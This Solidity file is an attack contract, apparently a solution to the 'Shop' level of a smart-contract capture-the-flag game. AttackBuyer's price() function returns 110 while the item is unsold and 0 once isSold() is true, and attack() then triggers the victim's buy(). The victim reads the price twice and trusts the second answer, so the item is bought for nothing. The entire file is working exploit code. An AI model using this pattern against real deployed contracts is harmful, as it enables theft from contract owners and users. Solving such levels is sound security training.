// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Shop.sol';

contract AttackBuyer is Buyer{
    Shop immutable victim;

    constructor(Shop _victim) {
        victim = _victim;
    }

    function price() external view returns(uint) {
        if(victim.isSold() == true) {
            return 0;
        }
        return 110;
    }

    function attack() external {
        victim.buy();
    }
}